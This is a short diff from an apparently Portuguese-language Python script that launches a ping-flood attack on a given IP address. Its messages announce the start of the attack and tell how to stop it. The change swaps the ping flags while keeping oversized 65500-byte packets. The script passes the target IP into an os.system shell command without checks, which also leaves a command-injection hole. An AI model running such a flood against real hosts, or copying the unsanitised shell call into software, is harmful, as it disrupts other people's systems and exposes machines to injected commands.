@@ -36,7 +36,7 @@ def script():
     time.sleep(1)
     print(vermelho+"Para parar o ataque, aperte"+azul+" ctrl+d")
     print("Ataque iniciado...")
-    os.system("Ping -t -l 65500 "+ip)
+    os.system("Ping -s 65500 "+ip)
 script()
     
     
